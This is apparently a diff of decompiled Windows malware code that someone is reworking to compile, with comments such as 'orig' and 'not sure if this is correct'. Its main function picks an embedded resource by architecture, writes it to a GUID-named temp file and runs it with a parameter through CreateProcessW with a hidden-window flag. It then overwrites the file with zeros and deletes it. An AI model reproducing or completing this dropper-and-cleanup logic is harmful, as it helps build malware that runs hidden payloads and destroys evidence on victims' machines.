@@ -5470,11 +5470,14 @@ struct _RTL_CRITICAL_SECTION *__stdcall sub_681F7091(LONG a1, ULONG_PTR a2, _RTL
 //----- (681F70FA) --------------------------------------------------------
 signed int  EnterAndLeaveCritSection_4(int a1) // remove?
 {
+	//Orig 
+	/*
 	if (!a1)
 		return 0;
 	EnterCriticalSection(a1);
 	InterlockedExchange((a1 + 40), 1);
 	LeaveCriticalSection(a1);
+	return 1;*/
 	return 1;
 }
 
@@ -5682,9 +5685,9 @@ int __stdcall EnumerateProcessHeap(LPCRITICAL_SECTION lpCriticalSection, void *S
 }
 
 //----- (681F73AE) --------------------------------------------------------
-signed int  CreateFileAndWrite(int a1, LPCWSTR lpFileName, LPCVOID lpBuffer)
+signed int  CreateFileAndWrite(int a1, LPCWSTR lpFileName, LPCVOID lpBuffer)// Should retn BOOL
 {
-	signed int v3; // esi
+	signed int v3; // esi // Should be BOOL
 	HANDLE v4; // edi
 
 	v3 = 0;
@@ -5801,15 +5804,17 @@ int  Enum64BitProcessAndComPipes(__m64 a1, __m64 a2)
 	WCHAR Parameter; // [esp+808h] [ebp-12A0h]
 	WCHAR Buffer; // [esp+1008h] [ebp-AA0h]
 	WCHAR TempFileName; // [esp+1418h] [ebp-690h]
-	int Dst; // [esp+1A30h] [ebp-78h]
+	void* Dst; // [esp+1A30h] [ebp-78h]
 	__int16 v18; // [esp+1A60h] [ebp-48h]
 	struct _PROCESS_INFORMATION ProcessInformation; // [esp+1A74h] [ebp-34h]
+	STARTUPINFOW            si; // orig // didn't have this function . I see this struct is used everywhere. Therefore it is probably GLOBAL
 	GUID pguid; // [esp+1A84h] [ebp-24h]
 	HANDLE hThread; // [esp+1A94h] [ebp-14h]
 	int v22; // [esp+1A98h] [ebp-10h]
 	LPOLESTR lpsz; // [esp+1A9Ch] [ebp-Ch]
 	LPVOID lpMem; // [esp+1AA0h] [ebp-8h]
 	int v25; // [esp+1AA4h] [ebp-4h]
+
 
 	lpMem = 0;
 	v25 = 0;
@@ -5821,7 +5826,7 @@ int  Enum64BitProcessAndComPipes(__m64 a1, __m64 a2)
 		//(v4)(&v22); // I think this is IsWow64Process(v2, v22); //orig
 		IsWow64Process(v2, &v22);
 	//v5 = FindResourceW(Src, ((v22 != 0) + 1), 0xA); //orig
-	v5 = FindResourceW(Src, ((v22 != 0) + 1), MAKEINTRESOURCE(10));
+	v5 = FindResourceW(Src, MAKEINTRESOURCE(1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL)); // not sure if this is correct.
 	if (v5)
 		result = LoadAndLock(&lpMem, a1, a2, &v25, v5);
 	else
@@ -5839,7 +5844,8 @@ int  Enum64BitProcessAndComPipes(__m64 a1, __m64 a2)
 				if (CoCreateGuid(&pguid) >= 0)
 				{
 					lpsz = 0;
-					if (StringFromCLSID(&pguid, &lpsz) >= 0)
+					//if (StringFromCLSID(&pguid, &lpsz) >= 0) // orig
+					if (StringFromCLSID(pguid, &lpsz) >= 0)
 					{
 						if (CreateFileAndWrite(v25, &TempFileName, lpMem))
 						{
@@ -5851,21 +5857,27 @@ int  Enum64BitProcessAndComPipes(__m64 a1, __m64 a2)
 								ProcessInformation.hThread = 0;
 								ProcessInformation.dwProcessId = 0;
 								ProcessInformation.dwThreadId = 0;
-								memset(&Dst, 0, 0x44u);
+								// memset(&Dst, 0, 0x44u); // orig
+								memset(&si, 0, sizeof(si));// Is this even safe?
 								v18 = 0;
-								Dst = 68;
+								//Dst = 0x44u; // orig wasn't comented out
 								wsprintfW(&CommandLine, L"\"%ws\" %ws", &TempFileName, &Parameter);
-								if (CreateProcessW(&TempFileName, &CommandLine, 0, 0, 0, 0x8000000u, 0, 0, &Dst, &ProcessInformation))
+		
+								if (CreateProcessW(&TempFileName, &CommandLine, 0, 0, 0, 0x8000000u, 0, 0, &si, &ProcessInformation))
 								{
 									WaitForSingleObject(ProcessInformation.hProcess, 0xEA60u);
-									EnterAndLeaveCritSection_4(lpCriticalSection);
+									EnterAndLeaveCritSection_4((int )lpCriticalSection); // probably can remove.
 									TerminateThread(hThread, 0);
 								}
 								CloseHandle(hThread);
 							}
 							v7 = v25;
-							for (i = lpMem; v7; --v7)
-								*i++ = 0;
+							//orig
+							//for (i = lpMem; v7; --v7) //orig// Surely this can be better,
+							//	*i++ = 0;//
+
+							memset(lpMem, 0, v7); // I think this makes more sense . 
+
 							CreateFileAndWrite(v25, &TempFileName, lpMem);
 							DeleteFileW(&TempFileName);
 						}
@@ -5875,8 +5887,13 @@ int  Enum64BitProcessAndComPipes(__m64 a1, __m64 a2)
 			}
 		}
 		v9 = v25;
+		// Orig
+		/*
 		for (j = lpMem; v9; --v9)
 			*j++ = 0;
+			*/
+		memset(lpMem, 0, v9);
+
 		v11 = lpMem;
 		v12 = GetProcessHeap();
 		result = HeapFree(v12, 0, v11);
